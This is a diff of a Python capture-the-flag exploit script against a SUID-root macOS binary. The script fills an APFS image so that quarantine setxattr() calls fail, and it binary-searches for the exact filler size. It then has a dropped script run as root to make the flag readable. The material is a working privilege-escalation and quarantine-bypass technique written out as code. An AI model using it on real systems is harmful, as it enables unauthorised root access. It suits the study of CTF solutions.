@@ -2,86 +2,121 @@
 #
 #  Solution
 #  --------
-#  1. The "gates_bill" binary creates a 1 GB APFS sparse image and extracts our zip into it.
-#  2. After extraction, the binary adds a "com.apple.quarnatine" xattr with flags "0041" into each file.
-#  3. Finally, the binary launches an extracted "FlagReader.app" via the "open" utility.
-#  4. The critical issue - setxattr() calls are not checked against failure.
-#  5. Exploitation involves filling up the APFS volume to exactly its maximum write-limit and then making setxattr() fail with ENOSPC.
+#  1. The "gates_bill" binary creates a 1 GB APFS disk image and extracts our zip into it.
+#  2. After extraction it stamps every file with a "com.apple.quarantine" xattr (flags "0005").
+#  3. It then runs "/Users/ctf/mnt/entry" only if that file has no quarantine attribute.
+#  4. The critical bug: setxattr() return values are silently ignored.
+#  5. Thus, we fill the disk completely (using binary search to calibrate) and find the "sweet spot".
 #
 import os
 import stat
+import subprocess
 import zipfile
 
-# Output zip file
-OUTPUT_ZIP = 'exploit.zip'
+# Fine tunables
+GATES_BILL = '/Users/ctf/gates_bill'
+OUTPUT_ZIP = '/tmp/exploit_probe.zip'
+FLAG_PATH = '/Users/ctf/flag'
 
-# Calibrated for `hdiutil create -size 1g -type SPARSE -fs APFS`.
-# FlagReader.app consumes ~3 data blocks; total target: 255,937 blocks.
-FILLER_BLOCKS = 255_934
-FILLER_SIZE = FILLER_BLOCKS * 4096
+# Initial low and high values for binary search
+BLOCKS_LO = 200000
+BLOCKS_HI = 270000
 
-# The "FlagReader.app" plist
-PLIST = b'''\
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
-  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>CFBundleExecutable</key>
-    <string>FlagReader</string>
-    <key>CFBundleIdentifier</key>
-    <string>com.ctf.flagreader</string>
-    <key>CFBundleName</key>
-    <string>FlagReader</string>
-    <key>CFBundlePackageType</key>
-    <string>APPL</string>
-    <key>CFBundleVersion</key>
-    <string>1.0</string>
-    <key>LSUIElement</key>
-    <true/>
-    <key>LSMinimumSystemVersion</key>
-    <string>10.15</string>
-</dict>
-</plist>
+# Number of "pre-files"
+PRE_FILES = 50
+
+# Shell script run as root (gates_bill is SUID root)
+ENTRY_SCRIPT = f'''#!/bin/bash
+chmod 755 {FLAG_PATH}
 '''
 
-# Shell script run by Launch Services
-FLAGREADER_SCRIPT = b'''
-#!/bin/bash
-cp /Users/ctf/flag /tmp/ctf_flag
-chmod 644 /tmp/ctf_flag
-'''
+# Markers
+MARKER_TOO_SMALL = 1
+MARKER_TOO_BIG = 2
 
-def create_exploit_zip(output:str=OUTPUT_ZIP, filler_size:int=FILLER_SIZE):
+def create_exploit_zip(output:str, filler_blocks:int, pre_files:int):
     """
-        Creates the exploit zip file.
+        Build the exploit zip.
     """
 
-    # Create the zipfile
-    with zipfile.ZipFile(output, 'w') as zf:
+    # Build the zipfile
+    with zipfile.ZipFile(output, 'w', allowZip64=True) as zf:
 
-        # FlagReader.app — must be come first before the filler fills the disk
-        zf.writestr('FlagReader.app/Contents/Info.plist', PLIST)
-        exe_info = zipfile.ZipInfo('FlagReader.app/Contents/MacOS/FlagReader')
-        exe_info.compress_type = zipfile.ZIP_DEFLATED
-        exe_info.external_attr = (stat.S_IFREG | 0o755) << 16
-        zf.writestr(exe_info, FLAGREADER_SCRIPT)
+        # Root-level pre-files ("a" prefix → visited before "entry" by nftw)
+        for i in range(pre_files):
+            zf.writestr(zipfile.ZipInfo(f'a{i:05d}'), b'x')
 
-        # 2. Large filler — zeros deflate to ~0 bytes but expand to ~1 GB on disk.
+        # Payload
+        entry_info = zipfile.ZipInfo('entry')
+        entry_info.compress_type = zipfile.ZIP_DEFLATED
+        zf.writestr(entry_info, ENTRY_SCRIPT.encode('utf8'))
+
+        # Filler
         filler_info = zipfile.ZipInfo('filler.bin')
         filler_info.compress_type = zipfile.ZIP_DEFLATED
-        chunk = b'\x00' * (4 * 1024 * 1024)
-        remaining = filler_size
+        chunk = b'\xAA' * (4 * 1024 * 1024)
+        remaining = filler_blocks * 4096
+
+        # Write file
         with zf.open(filler_info, 'w') as fout:
             while remaining > 0:
                 n = min(len(chunk), remaining)
                 fout.write(chunk[:n])
                 remaining -= n
 
-    zip_bytes = os.path.getsize(output)
-    print('Run:')
-    print(f'  /Users/ctf/gates_bill $(pwd)/{output}')
-    print('  cat /tmp/ctf_flag')
+
+def probe(filler_blocks:int, pre_files:int):
+    """
+        Run the challenge with the given parameters.
+        Returns one of of the markers (MARKER_TOO_SMALL, MARKER_TOO_BIG) or the contents of the flag.
+    """
+
+    # Creates the exploit zip
+    create_exploit_zip(OUTPUT_ZIP, filler_blocks, pre_files)
+
+    # Run the binary
+    result = subprocess.run([GATES_BILL, OUTPUT_ZIP], capture_output=True, text=True)
+    combined = result.stdout + result.stderr
+
+    # Try to read flag
+    try:
+        with open(FLAG_PATH, 'r') as fp:
+            return fp.read()
+    except:
+        pass
+
+    # Parse output
+    if 'archive_write_data_block failed' in combined or 'archive_write_header failed' in combined:
+        return MARKER_TOO_BIG
+    if 'you shall not pass' in combined:
+        return MARKER_TOO_SMALL
+    raise Exception(f'Unexpected output\n{combined}')
+
+
+def solve(pre_files:int):
+    """
+        Binary-search filler blocks for the given pre-files count.
+    """
+
+    # Initial low and high values
+    lo, hi = BLOCKS_LO, BLOCKS_HI
+
+    # Perform binary search
+    while lo <= hi:
+        mid = (lo + hi) // 2
+        outcome = probe(mid, pre_files)
+        if isinstance(outcome, str):
+            return outcome
+        elif outcome == MARKER_TOO_BIG:
+            hi = mid - 1
+        else:
+            lo = mid + 1
+
+    # No calibration
+    raise Exception('Calibration unsuccessful')
 
 if __name__ == '__main__':
-    create_exploit_zip()
+
+    # Solve
+    print(solve(PRE_FILES))
+
